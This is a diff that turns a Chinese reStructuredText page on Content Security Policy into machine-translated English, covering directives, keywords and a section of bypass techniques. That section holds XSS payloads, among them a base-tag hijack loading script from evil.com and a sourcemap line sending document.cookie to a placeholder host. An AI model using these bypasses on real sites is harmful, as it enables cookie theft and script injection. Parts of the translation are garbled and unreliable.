@@ -1,15 +1,15 @@
 CSP
 ========================================
 
-CSP是什么？
+What is CSP?
 ----------------------------------------
-Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。
+Content Security Policy, referred to as CSP, is translated as content security policy. As the name suggests, this specification is related to content security, mainly used to define which resources can be loaded by the current page to reduce the occurrence of XSS.
 
-配置
+Configuration
 ----------------------------------------
-CSP策略可以通过 HTTP 头信息或者 meta 元素定义。
+CSP policies can be defined through HTTP header information or meta elements.
 
-CSP 有三类：
+There are three categories of CSP:
 
 - Content-Security-Policy  (Google Chrome)
 - X-Content-Security-Policy (Firefox)
@@ -17,160 +17,160 @@ CSP 有三类：
 
 ::
 
-    HTTP header :
-    "Content-Security-Policy:" 策略
-    "Content-Security-Policy-Report-Only:" 策略
+HTTP header :
+"Content-Security-Policy:" policy
+"Content-Security-Policy-Report-Only:" Policy
 
 
-HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而Content-Security-Policy-Report-Only则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。
+The HTTP Content-Security-Policy header can specify that one or more resources are secure, while Content-Security-Policy-Report-Only allows the server to check (not enforce) a policy. The policy definition of multiple headers is first defined by priority.
 
 HTML Meta :
 ::
 
-    <meta http-equiv="content-security-policy" content="策略">
-    <meta http-equiv="content-security-policy-report-only" content="策略">
+<meta http-equiv="content-security-policy" content="策略">
+<meta http-equiv="content-security-policy-report-only" content="策略">
 
 
-指令说明
+Instructions
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ============    ============
-指令            说明     
+Instructions Description
 ============    ============
-default-src     定义资源默认加载策略
-connect-src     定义 Ajax、WebSocket 等加载策略
-font-src        定义 Font 加载策略
-frame-src       定义 Frame 加载策略
-img-src         定义图片加载策略
-media-src       定义 <audio>、<video> 等引用资源加载策略
-object-src      定义 <applet>、<embed>、<object> 等引用资源加载策略
-script-src      定义 JS 加载策略
-style-src       定义 CSS 加载策略
-base-uri        定义 <base> 根URL策略，不使用default-src作为默认值
-sandbox         值为 allow-forms，对资源启用 sandbox
-report-uri      值为 /report-uri，提交日志
+default-src defines the resource default loading policy
+connect-src defines loading strategies such as Ajax, WebSocket, etc.
+font-src defines Font loading policy
+frame-src defines Frame loading policy
+img-src defines image loading strategy
+media-src defines the reference resource loading strategies such as <audio>, <video>, etc.
+object-src defines the reference resource loading strategies such as <applet>, <embed>, <object>, etc.
+script-src defines JS loading policy
+style-src defines CSS loading policy
+base-uri defines the <base> root URL policy, without using default-src as the default value
+sandbox value is allow-forms, enable sandbox for resources
+The value of report-uri is /report-uri, submit log
 ============    ============
 
-关键字
+Keywords
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - ``-``
-    - 允许从任意url加载，除了 ``data:`` ``blob:`` ``filesystem:`` ``schemes``
-    - e.g. ``img-src -``
+- Allow loading from any url except ``data:``````` ``` ``` filesystem:``````````` schemes``
+- e.g. ``img-src -``
 - ``none``
-    - 禁止从任何url加载资源
-    - e.g. ``object-src 'none'``
+- Disable loading of resources from any url
+- e.g. ``object-src 'none'``
 - ``self``
-    - 只可以加载同源资源
-    - e.g. ``img-src 'self'``
+- Only homologous resources can be loaded
+- e.g. ``img-src 'self'``
 - ``data:``
-    - 可以通过data协议加载资源
-    - e.g. ``img-src 'self' data:``
+- Resources can be loaded through the data protocol
+- e.g. ``img-src 'self' data:``
 - ``domain.example.com``
-    - e.g. ``img-src domain.example.com``
-    - 只可以从特定的域加载资源
+- e.g. ``img-src domain.example.com``
+- Resources can only be loaded from specific domains
 - ``\*.example.com``
-    - e.g. ``img-src \*.example.com``
-    - 可以从任意example.com的子域处加载资源
+- e.g. ``img-src \*.example.com``
+- Resources can be loaded from any subdomain of example.com
 - ``https://cdn.com``
-    - e.g. ``img-src https://cdn.com``
-    - 只能从给定的域用https加载资源
+- e.g. ``img-src https://cdn.com``
+- Resources can only be loaded with https from a given domain
 - ``https:``
-    - e.g. ``img-src https:``
-    - 只能从任意域用https加载资源
+- e.g. ``img-src https:``
+- Only use https to load resources from any domain
 - ``unsafe-inline``
-    - 允许内部资源执行代码例如style attribute,onclick或者是sicript标签
-    - e.g. ``script-src 'unsafe-inline'``
+- Allow internal resources to execute code such as style attribute, onclick or sict tags
+- e.g. ``script-src 'unsafe-inline'``
 - ``unsafe-eval``
-    - 允许一些不安全的代码执行方式，例如js的eval()
-    - e.g. ``script-src 'unsafe-eval'``
+- Allow some unsafe code execution methods, such as eval() of js
+- e.g. ``script-src 'unsafe-eval'``
 - ``nonce-<base64-value>'``
-    - 使用随机的nonce，允许加载标签上nonce属性匹配的标签
-    - e.g. ``script-src 'nonce-bm9uY2U='``
-- ``<hash-algo>-<base64-value>'``
-    - 允许hash值匹配的代码块被执行
-    - e.g. ``script-src 'sha256-<base64-value>'``
+- Use random nonce to allow loading tags with matching tags with nonce attributes on tags
+- e.g. ``script-src 'nonce-bm9uY2U='``
+-`` <hash-algo>-<base64-Value> '`
+- Allows the code block that matches hash values to be executed
+- e.g. ``script-src 'sha256-<base64-value>'``
 
-配置范例
+Configuration Example
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-允许执行内联 JS 代码，但不允许加载外部资源
+Allows execution of inline JS code, but does not allow external resources to be loaded
 ::
 
-    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
 
 
 Bypass
 ---------------------------------------
 
-预加载
+Preload
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为DNS-prefetch、subresource、prefetch、preconnect、prerender。
+In order to enhance the user experience and make the browser more efficient, the browser has a preload function, which basically uses the browser's idle time to load the specified content and then cache it. This technology is further subdivided into DNS-prefetch, subresource, prefetch, preconnect, and prerender.
 
-HTML5页面预加载是用link标签的rel属性来指定的。如果csp头有unsafe-inline，则用预加载的方式可以向外界发出请求，例如
+HTML5 page preloading is specified using the rel attribute of the link tag. If the csp header has unsafe-inline, then a request can be made to the outside world by preloading, for example
 
 ::
 
-    <!-- 预加载某个页面 -->
-    <link rel='prefetch' href='http://xxxx'><!-- firefox -->
-    <link rel='prerender' href='http://xxxx'><!-- chrome -->
-    <!-- 预加载某个图片 -->
-    <link rel='prefetch' href='http://xxxx/x.jpg'>
-    <!-- DNS 预解析 -->
-    <link rel="dns-prefetch" href="http://xxxx">
-    <!-- 特定文件类型预加载 -->
-    <link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->
+<!-- Preload a page -->
+<link rel='prefetch' href='http://xxxx'><!-- firefox -->
+<link rel='prerender' href='http://xxxx'><!-- chrome -->
+<!-- Preload a picture -->
+<link rel='prefetch' href='http://xxxx/x.jpg'>
+<!-- DNS pre-resolution -->
+<link rel="dns-prefetch" href="http://xxxx">
+<!-- Preload for specific file types -->
+<link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->
 
-另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：
+In addition, not all pages can be preloaded, and when the resource type is as follows, the preload operation will be blocked:
 
-- URL中包含下载资源
-- 页面中包含音频、视频
-- POST、PUT和DELET操作的ajax请求
-- HTTP认证
-- HTTPS页面
-- 含恶意软件的页面
-- 弹窗页面
-- 占用资源很多的页面
-- 打开了chrome developer tools开发工具
+- The URL contains download resources
+- The page contains audio and video
+- Ajax requests for POST, PUT and DELET operations
+- HTTP authentication
+- HTTPS page
+- Pages containing malware
+- Pop-up page
+- Pages that take up a lot of resources
+- The Chrome developer tools development tool has been opened
 
 MIME Sniff
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再``<script href='http://xxx.com/xx.jpg'>``，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本
+For example, csp prohibits cross-site reading of scripts, but can read imgs across sites. Then pass an img with scripts and then ``<script href='http://xxx.com/xx.jpg'>`` , here csp thinks it is an img, bypassing the check. If the website does not return the correct mime type, the browser will make a guess, and the img may be loaded as a script.
 
-302跳转
+302 jump
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-对于302跳转绕过CSP而言，实际上有以下几点限制：
+For 302 jump bypass CSP, there are actually the following restrictions:
 
-- 跳板必须在允许的域内。
-- 要加载的文件的host部分必须跟允许的域的host部分一致
+- The springboard must be within the allowed domain.
+- The host part of the file to be loaded must be consistent with the host part of the allowed domain
 
 iframe
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-当可以执行代码时，可以创建一个源为 ``css`` ``js`` 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 ``../../../`` ``/%2e%2e%2f`` 等可能触发服务器报错的链接也可以到达相应的目的。
+When you can execute code, you can create a frame with a static file such as ``css```js`. When the configuration is not configured, the frame does not exist in csp. Then create the frame again under the frame to reach bypass purpose. Similarly, using links such as ``../../../````/%2e%2e%2f`` that may trigger the server error can also achieve the corresponding purpose.
 
-base-uri
+Bases
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-当script-src为nonce或无限制，且base-uri无限制时，可通过 ``base`` 标签修改根URL来bypass，如下加载了http://evil.com/main.js
+When script-src is nonce or unlimited, and base-uri is unlimited, you can modify the root URL through the ``base`` tag to bypass, as follows: http://evil.com/main.js
 
 ::
 
-    <base href="http://evil.com/">
-    <script nonce="correct value" src="/main.js"></script>
+<base href="http://evil.com/">
+<script nonce="correct value" src="/main.js"></script>
 
-其他
+other
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- location 绕过
-- 可上传SVG时，通过恶意SVG绕过同源站点
-- 存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析
-- CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass
-- Angular versions <1.5.9 >=1.5.0，存在漏洞 `Git Pull Request <https://github.com/angular/angular.js/pull/15346>`_
-- jQuery sourcemap 
-    ::
+- location Bypass
+- When uploading SVG, bypassing homologous sites through malicious SVG
+- When there is a CRLF vulnerability and the controllable point is above the CSP, it can inject HTTP response to affect CSP resolution
+- CND Bypass, if the website trusts a CDN, then the static resource of the corresponding CDN can be used bypass
+- Angular versions <1.5.9 >=1.5.0, vulnerability `Git Pull Request <https://github.com/angular/angular.js/pull/15346>`_
+- jQuery sourcemap
+::
 
-        document.write(`<script>
-        //@        sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);``
-- a标签的ping属性
+document.write(`<script>
+//@        sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);``
+- ping properties of a tag
 - For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
 - ``<link rel="import" />``
 - ``<meta http-equiv="refresh" content="0; url=http://...." />``
-- 仅限制 ``script-src`` 时：
-    - ``<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>``
+- Only restrict ``script-src`` when:
+- ``<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>``
